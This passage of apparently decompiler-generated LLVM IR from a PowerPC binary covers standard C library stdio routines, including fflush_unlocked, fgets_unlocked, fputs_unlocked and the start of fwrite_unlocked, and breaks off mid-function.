  store i32 ptrtoint ([3 x i8]* @global_var_1000f670.827 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_1002e290.828 to i32), i32* @r29, align 4
  %v2_1000cca8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000cca8, i32* @r3, align 4
  %v0_1000ccb0 = call i32 @__pthread_return_void()
  %v0_1000ccb8 = call i32 @__pthread_return_0()
  %v3_1000ccc0 = load i32, i32* @global_var_1002e620.829, align 4
  %v3_1000ccc4 = icmp eq i32 %v3_1000ccc0, 1
  br i1 %v3_1000ccc4, label %dec_label_pc_1000cccc, label %dec_label_pc_1000cd74

dec_label_pc_1000cccc:                            ; preds = %entry
  %v3_1000ccd0 = load i32, i32* @global_var_1002e624.830, align 4
  %tmp7 = icmp slt i32 %v3_1000ccd0, 1
  br i1 %tmp7, label %dec_label_pc_1000cd74, label %dec_label_pc_1000ccdc

dec_label_pc_1000ccdc:                            ; preds = %dec_label_pc_1000cccc
  %v2_1000cce8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000cce8, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_1000ccf4 = call i32 @__pthread_return_void()
  %v0_1000ccfc = call i32 @__pthread_return_0()
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_1002e5d0.835 to i32*), align 4
  store i32 %storemerge8, i32* @r29, align 4
  %v3_1000cd5411 = icmp eq i32 %storemerge8, 0
  %v0_1000cd5812 = load i32, i32* @r30, align 4
  br i1 %v3_1000cd5411, label %dec_label_pc_1000cd60, label %dec_label_pc_1000cd0c

dec_label_pc_1000cd0c:                            ; preds = %dec_label_pc_1000ccdc, %dec_label_pc_1000cd54.backedge
  %v0_1000cd5817 = phi i32 [ %v0_1000cd58, %dec_label_pc_1000cd54.backedge ], [ %v0_1000cd5812, %dec_label_pc_1000ccdc ]
  %v3_1000cd5818.in = phi i32 [ %v0_1000cd58, %dec_label_pc_1000cd54.backedge ], [ %v0_1000cd5812, %dec_label_pc_1000ccdc ]
  %storemerge16 = phi i32 [ %storemerge, %dec_label_pc_1000cd54.backedge ], [ %storemerge8, %dec_label_pc_1000ccdc ]
  %v1_1000cd0c = inttoptr i32 %storemerge16 to i16*
  %v2_1000cd0c = load i16, i16* %v1_1000cd0c, align 2
  %v1_1000cd10 = add i32 %storemerge16, 32
  %v2_1000cd10 = inttoptr i32 %v1_1000cd10 to i32*
  %v3_1000cd10 = load i32, i32* %v2_1000cd10, align 4
  store i32 %v3_1000cd10, i32* @r31, align 4
  %v1_1000cd14 = and i16 %v2_1000cd0c, -32720
  %v3_1000cd18 = icmp eq i16 %v1_1000cd14, 48
  br i1 %v3_1000cd18, label %dec_label_pc_1000cd28, label %dec_label_pc_1000cd20

dec_label_pc_1000cd20:                            ; preds = %dec_label_pc_1000cd0c
  store i32 %storemerge16, i32* @r30, align 4
  br label %dec_label_pc_1000cd54.backedge

dec_label_pc_1000cd28:                            ; preds = %dec_label_pc_1000cd0c
  %v3_1000cd5818 = icmp eq i32 %v3_1000cd5818.in, 0
  br i1 %v3_1000cd5818, label %dec_label_pc_1000cd2c, label %dec_label_pc_1000cd38

dec_label_pc_1000cd2c:                            ; preds = %dec_label_pc_1000cd28
  store i32 %v3_1000cd10, i32* bitcast (i32** @global_var_1002e5d0.835 to i32*), align 4
  br label %dec_label_pc_1000cd3c

dec_label_pc_1000cd38:                            ; preds = %dec_label_pc_1000cd28
  %v2_1000cd38 = add i32 %v0_1000cd5817, 32
  %v3_1000cd38 = inttoptr i32 %v2_1000cd38 to i32*
  store i32 %v3_1000cd10, i32* %v3_1000cd38, align 4
  %v0_1000cd3c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000cd3c

dec_label_pc_1000cd3c:                            ; preds = %dec_label_pc_1000cd2c, %dec_label_pc_1000cd38
  %v0_1000cd3c = phi i32 [ %storemerge16, %dec_label_pc_1000cd2c ], [ %v0_1000cd3c.pre, %dec_label_pc_1000cd38 ]
  %v1_1000cd3c = inttoptr i32 %v0_1000cd3c to i16*
  %v2_1000cd3c = load i16, i16* %v1_1000cd3c, align 2
  store i32 %v0_1000cd3c, i32* @r3, align 4
  %v1_1000cd44 = and i16 %v2_1000cd3c, 8192
  %v3_1000cd44 = icmp eq i16 %v1_1000cd44, 0
  br i1 %v3_1000cd44, label %dec_label_pc_1000cd54.backedge, label %dec_label_pc_1000cd4c

dec_label_pc_1000cd54.backedge:                   ; preds = %dec_label_pc_1000cd3c, %dec_label_pc_1000cd20, %dec_label_pc_1000cd4c
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_1000cd54 = icmp eq i32 %storemerge, 0
  %v0_1000cd58 = load i32, i32* @r30, align 4
  br i1 %v3_1000cd54, label %dec_label_pc_1000cd60, label %dec_label_pc_1000cd0c

dec_label_pc_1000cd4c:                            ; preds = %dec_label_pc_1000cd3c
  store i32 268488016, i32* @lr, align 4
  %v0_1000cd4c = call i32 @free()
  br label %dec_label_pc_1000cd54.backedge

dec_label_pc_1000cd60:                            ; preds = %dec_label_pc_1000cd54.backedge, %dec_label_pc_1000ccdc
  store i32 %v2_1000cce8, i32* @r3, align 4
  %v0_1000cd68 = call i32 @__pthread_return_void()
  %v0_1000cd70 = load i32, i32* @r29, align 4
  store i32 %v0_1000cd70, i32* @global_var_1002e624.830, align 4
  %v3_1000cd7c.pre = load i32, i32* @global_var_1002e620.829, align 4
  br label %dec_label_pc_1000cd74

dec_label_pc_1000cd74:                            ; preds = %entry, %dec_label_pc_1000cccc, %dec_label_pc_1000cd60
  %v3_1000cd7c = phi i32 [ %v3_1000ccc0, %entry ], [ 1, %dec_label_pc_1000cccc ], [ %v3_1000cd7c.pre, %dec_label_pc_1000cd60 ]
  store i32 %v2_1000cca8, i32* @r3, align 4
  %v1_1000cd84 = add i32 %v3_1000cd7c, -1
  store i32 %v1_1000cd84, i32* @global_var_1002e620.829, align 4
  %v0_1000cd8c = call i32 @__pthread_return_void()
  ret i32 %v0_1000cd8c

; uselistorder directives
  uselistorder i32 %v0_1000cd58, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000cd3c, { 1, 0 }
  uselistorder i32 %v3_1000cd10, { 1, 0, 2 }
  uselistorder i32 %storemerge16, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cd74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cd54.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cd3c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd0c, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_1002e5d0.835 to i32), i32* %r9.global-to-local, align 4
  %v5_1000cdb4 = icmp eq i16* %arg1, bitcast (i32** @global_var_1002e5d0.835 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_1000cdb4, label %dec_label_pc_1000cdd8, label %dec_label_pc_1000cdcc

dec_label_pc_1000cdcc:                            ; preds = %entry
  %v4_1000cdcc = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_1000cdcc, label %dec_label_pc_1000cdd8, label %dec_label_pc_1000cf04

dec_label_pc_1000cdd8:                            ; preds = %dec_label_pc_1000cdcc, %entry
  store i32 ptrtoint (i32* @global_var_10010000.9 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000f670.827 to i32), i32* @r30, align 4
  %v2_1000cde4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000cde4, i32* @r3, align 4
  %v0_1000cdf8 = call i32 @__pthread_return_void()
  %v0_1000ce00 = call i32 @__pthread_return_0()
  %v3_1000ce08 = load i32, i32* @global_var_1002e620.829, align 4
  store i32 %v2_1000cde4, i32* @r3, align 4
  %v1_1000ce18 = add i32 %v3_1000ce08, 1
  store i32 %v1_1000ce18, i32* %r9.global-to-local, align 4
  store i32 %v1_1000ce18, i32* @global_var_1002e620.829, align 4
  %v0_1000ce24 = call i32 @__pthread_return_void()
  store i32 %v2_1000cde4, i32* @r3, align 4
  %v0_1000ce34 = call i32 @__pthread_return_void()
  %v0_1000ce3c = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %v2_1000cde4, i32* @r3, align 4
  %v3_1000ce48 = load i32, i32* bitcast (i32** @global_var_1002e5d0.835 to i32*), align 4
  store i32 %v3_1000ce48, i32* @r31, align 4
  store i32 0, i32* @r28, align 4
  %v0_1000ce54 = call i32 @__pthread_return_void()
  %v0_1000cef4.pr = load i32, i32* @r31, align 4
  %v3_1000cef43 = icmp eq i32 %v0_1000cef4.pr, 0
  br i1 %v3_1000cef43, label %dec_label_pc_1000cefc, label %dec_label_pc_1000ce5c

dec_label_pc_1000ce5c:                            ; preds = %dec_label_pc_1000cdd8, %dec_label_pc_1000cef0
  %v0_1000ce78 = phi i32 [ %v3_1000cef0, %dec_label_pc_1000cef0 ], [ %v0_1000cef4.pr, %dec_label_pc_1000cdd8 ]
  %v1_1000ce5c = inttoptr i32 %v0_1000ce78 to i16*
  %v2_1000ce5c = load i16, i16* %v1_1000ce5c, align 2
  %v3_1000ce5c = zext i16 %v2_1000ce5c to i32
  %v1_1000ce60 = and i32 %v3_1000ce5c, 64
  store i32 %v1_1000ce60, i32* %r9.global-to-local, align 4
  %v3_1000ce60 = icmp eq i32 %v1_1000ce60, 0
  br i1 %v3_1000ce60, label %dec_label_pc_1000cef0, label %dec_label_pc_1000ce68

dec_label_pc_1000ce68:                            ; preds = %dec_label_pc_1000ce5c
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_1000ce6c = load i32, i32* @global_var_1002e5d4.833, align 4
  %v3_1000ce70 = icmp eq i32 %v3_1000ce6c, 2
  br i1 %v3_1000ce70, label %dec_label_pc_1000ce94, label %dec_label_pc_1000ce78

dec_label_pc_1000ce78:                            ; preds = %dec_label_pc_1000ce68
  store i32 %v2_1000cde4, i32* @r3, align 4
  %v0_1000ce88 = call i32 @__pthread_return_void()
  %v0_1000ce90 = call i32 @__pthread_return_0()
  %v0_1000ce94.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ce94

dec_label_pc_1000ce94:                            ; preds = %dec_label_pc_1000ce68, %dec_label_pc_1000ce78
  %v0_1000cea8 = phi i32 [ %v0_1000ce78, %dec_label_pc_1000ce68 ], [ %v0_1000ce94.pre, %dec_label_pc_1000ce78 ]
  %v1_1000ce94 = inttoptr i32 %v0_1000cea8 to i16*
  %v2_1000ce94 = load i16, i16* %v1_1000ce94, align 2
  %v3_1000ce94 = zext i16 %v2_1000ce94 to i32
  %v0_1000ce98 = load i32, i32* @r27, align 4
  %v2_1000ce98 = or i32 %v0_1000ce98, %v3_1000ce94
  %v1_1000ce9c = and i32 %v2_1000ce98, 832
  %v1_1000cea0 = xor i32 %v1_1000ce9c, 320
  store i32 %v1_1000cea0, i32* %r9.global-to-local, align 4
  %v3_1000cea0 = icmp eq i32 %v1_1000cea0, 0
  br i1 %v3_1000cea0, label %dec_label_pc_1000cea8, label %dec_label_pc_1000ced4

dec_label_pc_1000cea8:                            ; preds = %dec_label_pc_1000ce94
  store i32 %v0_1000cea8, i32* @r3, align 4
  store i32 268488368, i32* @lr, align 4
  %v0_1000ceac = call i32 @__stdio_wcommit()
  %v3_1000ceb0 = icmp eq i32 %v0_1000ceac, 0
  br i1 %v3_1000ceb0, label %dec_label_pc_1000cec0, label %dec_label_pc_1000ceb8

dec_label_pc_1000ceb8:                            ; preds = %dec_label_pc_1000cea8
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000ced4

dec_label_pc_1000cec0:                            ; preds = %dec_label_pc_1000cea8
  %v0_1000cec0 = load i32, i32* @r31, align 4
  %v1_1000cec0 = inttoptr i32 %v0_1000cec0 to i16*
  %v2_1000cec0 = load i16, i16* %v1_1000cec0, align 2
  %v3_1000cec0 = zext i16 %v2_1000cec0 to i32
  %v1_1000cec4 = add i32 %v0_1000cec0, 8
  %v2_1000cec4 = inttoptr i32 %v1_1000cec4 to i32*
  %v3_1000cec4 = load i32, i32* %v2_1000cec4, align 4
  store i32 %v3_1000cec4, i32* %r9.global-to-local, align 4
  %v1_1000cec8 = call i32 @__asm_rlwinm(i32 %v3_1000cec0, i32 0, i32 26, i32 24)
  %v2_1000cec8 = trunc i32 %v1_1000cec8 to i16
  %v1_1000cecc = load i32, i32* @r31, align 4
  %v2_1000cecc = add i32 %v1_1000cecc, 28
  %v3_1000cecc = inttoptr i32 %v2_1000cecc to i32*
  store i32 %v3_1000cec4, i32* %v3_1000cecc, align 4
  %v3_1000ced0 = load i32, i32* @r31, align 4
  %v4_1000ced0 = inttoptr i32 %v3_1000ced0 to i16*
  store i16 %v2_1000cec8, i16* %v4_1000ced0, align 2
  br label %dec_label_pc_1000ced4

dec_label_pc_1000ced4:                            ; preds = %dec_label_pc_1000ce94, %dec_label_pc_1000ceb8, %dec_label_pc_1000cec0
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_1000ced8 = load i32, i32* @global_var_1002e5d4.833, align 4
  %v3_1000cedc = icmp eq i32 %v3_1000ced8, 2
  br i1 %v3_1000cedc, label %dec_label_pc_1000cef0, label %dec_label_pc_1000cee4

dec_label_pc_1000cee4:                            ; preds = %dec_label_pc_1000ced4
  store i32 %v2_1000cde4, i32* @r3, align 4
  %v0_1000ceec = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000cef0

dec_label_pc_1000cef0:                            ; preds = %dec_label_pc_1000ced4, %dec_label_pc_1000ce5c, %dec_label_pc_1000cee4
  %v0_1000cef0 = load i32, i32* @r31, align 4
  %v1_1000cef0 = add i32 %v0_1000cef0, 32
  %v2_1000cef0 = inttoptr i32 %v1_1000cef0 to i32*
  %v3_1000cef0 = load i32, i32* %v2_1000cef0, align 4
  store i32 %v3_1000cef0, i32* @r31, align 4
  %v3_1000cef4 = icmp eq i32 %v3_1000cef0, 0
  br i1 %v3_1000cef4, label %dec_label_pc_1000cefc, label %dec_label_pc_1000ce5c

dec_label_pc_1000cefc:                            ; preds = %dec_label_pc_1000cef0, %dec_label_pc_1000cdd8
  store i32 ptrtoint (i32* @global_var_1000cf00.858 to i32), i32* @lr, align 4
  %v0_1000cefc = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_1000cf3c

dec_label_pc_1000cf04:                            ; preds = %dec_label_pc_1000cdcc
  %v3_1000cf04 = load i16, i16* %arg1, align 2
  %v4_1000cf04 = zext i16 %v3_1000cf04 to i32
  store i32 0, i32* @r28, align 4
  %v1_1000cf0c = and i32 %v4_1000cf04, 64
  store i32 %v1_1000cf0c, i32* %r9.global-to-local, align 4
  %v3_1000cf0c = icmp eq i32 %v1_1000cf0c, 0
  br i1 %v3_1000cf0c, label %dec_label_pc_1000cf3c, label %dec_label_pc_1000cf14

dec_label_pc_1000cf14:                            ; preds = %dec_label_pc_1000cf04
  store i32 268488472, i32* @lr, align 4
  %v0_1000cf14 = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_1000cf1c = icmp eq i32 %v0_1000cf14, 0
  br i1 %v3_1000cf1c, label %dec_label_pc_1000cf24, label %dec_label_pc_1000cf3c

dec_label_pc_1000cf24:                            ; preds = %dec_label_pc_1000cf14
  %v0_1000cf24 = load i32, i32* @r29, align 4
  %v1_1000cf24 = inttoptr i32 %v0_1000cf24 to i16*
  %v2_1000cf24 = load i16, i16* %v1_1000cf24, align 2
  %v3_1000cf24 = zext i16 %v2_1000cf24 to i32
  store i32 0, i32* @r28, align 4
  %v1_1000cf2c = add i32 %v0_1000cf24, 8
  %v2_1000cf2c = inttoptr i32 %v1_1000cf2c to i32*
  %v3_1000cf2c = load i32, i32* %v2_1000cf2c, align 4
  store i32 %v3_1000cf2c, i32* %r9.global-to-local, align 4
  %v1_1000cf30 = call i32 @__asm_rlwinm(i32 %v3_1000cf24, i32 0, i32 26, i32 24)
  %v2_1000cf30 = trunc i32 %v1_1000cf30 to i16
  %v3_1000cf34 = load i32, i32* @r29, align 4
  %v4_1000cf34 = inttoptr i32 %v3_1000cf34 to i16*
  store i16 %v2_1000cf30, i16* %v4_1000cf34, align 2
  %v0_1000cf38 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cf38 = load i32, i32* @r29, align 4
  %v2_1000cf38 = add i32 %v1_1000cf38, 28
  %v3_1000cf38 = inttoptr i32 %v2_1000cf38 to i32*
  store i32 %v0_1000cf38, i32* %v3_1000cf38, align 4
  br label %dec_label_pc_1000cf3c

dec_label_pc_1000cf3c:                            ; preds = %dec_label_pc_1000cf14, %dec_label_pc_1000cf04, %dec_label_pc_1000cefc, %dec_label_pc_1000cf24
  %v0_1000cf40 = load i32, i32* @r28, align 4
  ret i32 %v0_1000cf40

; uselistorder directives
  uselistorder i32 %v3_1000cef0, { 1, 2, 0 }
  uselistorder i32 %v1_1000cea0, { 1, 0 }
  uselistorder i32 %v2_1000cde4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32* bitcast (i32** @global_var_1002e5d0.835 to i32*), { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32* @global_var_1002e620.829, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i16* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000cf3c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000cef0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ced4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ce94, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce5c, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_1000cffc, label %dec_label_pc_1000cf74

dec_label_pc_1000cf74:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_1000cfdc3 = add i32 %arg2, -1
  store i32 %v2_1000cfdc3, i32* @r29, align 4
  %v4_1000cfe49 = icmp eq i32 %arg2, 1
  br i1 %v4_1000cfe49, label %dec_label_pc_1000cfe8, label %dec_label_pc_1000cf7c

dec_label_pc_1000cf7c:                            ; preds = %dec_label_pc_1000cf74, %dec_label_pc_1000cfdc.backedge
  %v2_1000cf98 = phi i32 [ %v2_1000cf9812, %dec_label_pc_1000cfdc.backedge ], [ %tmp, %dec_label_pc_1000cf74 ]
  %v0_1000cf7c = phi i32 [ %v0_1000cfe0, %dec_label_pc_1000cfdc.backedge ], [ %arg3, %dec_label_pc_1000cf74 ]
  %v1_1000cf7c = add i32 %v0_1000cf7c, 16
  %v2_1000cf7c = inttoptr i32 %v1_1000cf7c to i32*
  %v3_1000cf7c = load i32, i32* %v2_1000cf7c, align 4
  %v1_1000cf80 = add i32 %v0_1000cf7c, 24
  %v2_1000cf80 = inttoptr i32 %v1_1000cf80 to i32*
  %v3_1000cf80 = load i32, i32* %v2_1000cf80, align 4
  %v2_1000cf84 = add i32 %v3_1000cf7c, 1
  store i32 %v2_1000cf84, i32* %r11.global-to-local, align 4
  %v3_1000cf88 = icmp ult i32 %v3_1000cf7c, %v3_1000cf80
  %v5_1000cf88 = icmp eq i32 %v3_1000cf7c, %v3_1000cf80
  store i1 %v5_1000cf88, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cf88, label %dec_label_pc_1000cf90, label %dec_label_pc_1000cfac

dec_label_pc_1000cf90:                            ; preds = %dec_label_pc_1000cf7c
  %v4_1000cf7c = inttoptr i32 %v3_1000cf7c to i8*
  %v3_1000cf90 = load i8, i8* %v4_1000cf7c, align 1
  %v3_1000cf94 = icmp eq i8 %v3_1000cf90, 10
  store i1 %v3_1000cf94, i1* %cr7_eq.global-to-local, align 1
  %v3_1000cf98 = inttoptr i32 %v2_1000cf98 to i8*
  store i8 %v3_1000cf90, i8* %v3_1000cf98, align 1
  %v0_1000cf9c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cf9c = load i32, i32* @r30, align 4
  %v2_1000cf9c = add i32 %v1_1000cf9c, 16
  %v3_1000cf9c = inttoptr i32 %v2_1000cf9c to i32*
  store i32 %v0_1000cf9c, i32* %v3_1000cf9c, align 4
  %v0_1000cfa0 = load i32, i32* @r31, align 4
  %v1_1000cfa0 = add i32 %v0_1000cfa0, 1
  store i32 %v1_1000cfa0, i32* @r31, align 4
  %v0_1000cfa4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000cfa4, label %dec_label_pc_1000cfe8, label %dec_label_pc_1000cfdc.backedge

dec_label_pc_1000cfac:                            ; preds = %dec_label_pc_1000cf7c
  %v1_1000cfe010 = inttoptr i32 %v0_1000cf7c to i16*
  store i32 268488624, i32* @lr, align 4
  %v5_1000cfac = call i32 @getc_unlocked(i16* %v1_1000cfe010, i32 %v3_1000cf7c)
  %v6_1000cfac = trunc i32 %v5_1000cfac to i8
  %v4_1000cfb0 = icmp eq i8 %v6_1000cfac, -1
  store i1 %v4_1000cfb0, i1* %cr7_eq.global-to-local, align 1
  %v3_1000cfb8 = icmp eq i8 %v6_1000cfac, 10
  store i1 %v3_1000cfb8, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1000cfb0, label %dec_label_pc_1000cfc0, label %dec_label_pc_1000cfd0

dec_label_pc_1000cfc0:                            ; preds = %dec_label_pc_1000cfac
  %v0_1000cfc0 = load i32, i32* @r30, align 4
  %v1_1000cfc0 = inttoptr i32 %v0_1000cfc0 to i16*
  %v2_1000cfc0 = load i16, i16* %v1_1000cfc0, align 2
  %v1_1000cfc4 = and i16 %v2_1000cfc0, 8
  %v3_1000cfc4 = icmp eq i16 %v1_1000cfc4, 0
  br i1 %v3_1000cfc4, label %dec_label_pc_1000cfc0.dec_label_pc_1000cfe8_crit_edge, label %dec_label_pc_1000cffc

dec_label_pc_1000cfc0.dec_label_pc_1000cfe8_crit_edge: ; preds = %dec_label_pc_1000cfc0
  %v0_1000cfe8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cfe8

dec_label_pc_1000cfd0:                            ; preds = %dec_label_pc_1000cfac
  %v3_1000cfd0 = load i32, i32* @r31, align 4
  %v4_1000cfd0 = inttoptr i32 %v3_1000cfd0 to i8*
  store i8 %v6_1000cfac, i8* %v4_1000cfd0, align 1
  %v0_1000cfd4 = load i32, i32* @r31, align 4
  %v1_1000cfd4 = add i32 %v0_1000cfd4, 1
  store i32 %v1_1000cfd4, i32* @r31, align 4
  %v0_1000cfd8 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000cfd8, label %dec_label_pc_1000cfe8, label %dec_label_pc_1000cfdc.backedge

dec_label_pc_1000cfdc.backedge:                   ; preds = %dec_label_pc_1000cfd0, %dec_label_pc_1000cf90
  %v2_1000cf9812 = phi i32 [ %v1_1000cfd4, %dec_label_pc_1000cfd0 ], [ %v1_1000cfa0, %dec_label_pc_1000cf90 ]
  %v0_1000cfdc = load i32, i32* @r29, align 4
  %v2_1000cfdc = add i32 %v0_1000cfdc, -1
  store i32 %v2_1000cfdc, i32* @r29, align 4
  %v0_1000cfe0 = load i32, i32* @r30, align 4
  %v4_1000cfe4 = icmp eq i32 %v0_1000cfdc, 1
  br i1 %v4_1000cfe4, label %dec_label_pc_1000cfe8, label %dec_label_pc_1000cf7c

dec_label_pc_1000cfe8:                            ; preds = %dec_label_pc_1000cfd0, %dec_label_pc_1000cfdc.backedge, %dec_label_pc_1000cf90, %dec_label_pc_1000cf74, %dec_label_pc_1000cfc0.dec_label_pc_1000cfe8_crit_edge
  %v2_1000cff4 = phi i32 [ %v0_1000cfe8.pre, %dec_label_pc_1000cfc0.dec_label_pc_1000cfe8_crit_edge ], [ %tmp, %dec_label_pc_1000cf74 ], [ %v1_1000cfa0, %dec_label_pc_1000cf90 ], [ %v2_1000cf9812, %dec_label_pc_1000cfdc.backedge ], [ %v1_1000cfd4, %dec_label_pc_1000cfd0 ]
  %v1_1000cfe8 = load i32, i32* @r28, align 4
  %v3_1000cfe8 = icmp ugt i32 %v2_1000cff4, %v1_1000cfe8
  %v4_1000cfe8 = icmp eq i32 %v2_1000cff4, %v1_1000cfe8
  store i1 %v4_1000cfe8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cfe8, label %dec_label_pc_1000cff0, label %dec_label_pc_1000cffc

dec_label_pc_1000cff0:                            ; preds = %dec_label_pc_1000cfe8
  %v3_1000cff4 = inttoptr i32 %v2_1000cff4 to i8*
  store i8 0, i8* %v3_1000cff4, align 1
  %v0_1000d004.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000d000

dec_label_pc_1000cffc:                            ; preds = %dec_label_pc_1000cfc0, %dec_label_pc_1000cfe8, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000d000

dec_label_pc_1000d000:                            ; preds = %dec_label_pc_1000cff0, %dec_label_pc_1000cffc
  %v0_1000d004 = phi i32 [ %v0_1000d004.pre, %dec_label_pc_1000cff0 ], [ 0, %dec_label_pc_1000cffc ]
  ret i32 %v0_1000d004

; uselistorder directives
  uselistorder i32 %v2_1000cff4, { 0, 2, 1 }
  uselistorder i8 %v6_1000cfac, { 1, 0, 2 }
  uselistorder i32 %v3_1000cf80, { 1, 0 }
  uselistorder i32 %v3_1000cf7c, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_1000cf7c, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000d000, { 1, 0 }
  uselistorder label %dec_label_pc_1000cffc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cfe8, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1000cf7c, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000d030 = call i32 @__GI_strlen()
  store i32 %v0_1000d030, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1000d04c.859 to i32), i32* @lr, align 4
  %v4_1000d048 = inttoptr i32 %arg2 to i16*
  %v5_1000d048 = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_1000d030, i16* %v4_1000d048)
  %v1_1000d050 = load i32, i32* @r27, align 4
  %v4_1000d050 = icmp eq i32 %v5_1000d048, %v1_1000d050
  br i1 %v4_1000d050, label %dec_label_pc_1000d058, label %dec_label_pc_1000d05c

dec_label_pc_1000d058:                            ; preds = %entry
  br label %dec_label_pc_1000d05c

dec_label_pc_1000d05c:                            ; preds = %entry, %dec_label_pc_1000d058
  %v0_1000d05c = phi i32 [ -1, %entry ], [ %v5_1000d048, %dec_label_pc_1000d058 ]
  ret i32 %v0_1000d05c

; uselistorder directives
  uselistorder label %dec_label_pc_1000d05c, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_1000d08c = load i16, i16* %arg4, align 2
  %v4_1000d08c = zext i16 %v3_1000d08c to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_1000d09c = call i32 @__asm_rlwinm(i32 %v4_1000d08c, i32 0, i32 24, i32 25)
  store i32 %tmp, i32* @r3, align 4
  %v3_1000d0a4 = icmp eq i32 %v1_1000d09c, 192
  br i1 %v3_1000d0a4, label %dec_label_pc_1000d0b8, label %dec_label_pc_1000d0ac

dec_label_pc_1000d0ac:                            ; preds = %entry
  store i32 268488880, i32* @lr, align 4
  %v0_1000d0ac = call i32 @__stdio_trans2w_o()
  %v3_1000d0b0 = icmp eq i32 %v0_1000d0ac, 0
  br i1 %v3_1000d0b0, label %dec_label_pc_1000d0b8, label %dec_label_pc_1000d110

dec_label_pc_1000d0b8:                            ; preds = %dec_label_pc_1000d0ac, %entry
  %v0_1000d0b8 = load i32, i32* @r29, align 4
  %v3_1000d0b8 = icmp eq i32 %v0_1000d0b8, 0
  %v0_1000d0bc = load i32, i32* @r30, align 4
  %v3_1000d0bc = icmp eq i32 %v0_1000d0bc, 0
  %brmerge = or i1 %v3_1000d0b8, %v3_1000d0bc
  br i1 %brmerge, label %dec_label_pc_1000d110, label %dec_label_pc_1000d0c8

dec_label_pc_1000d0c8:                            ; preds = %dec_label_pc_1000d0b8
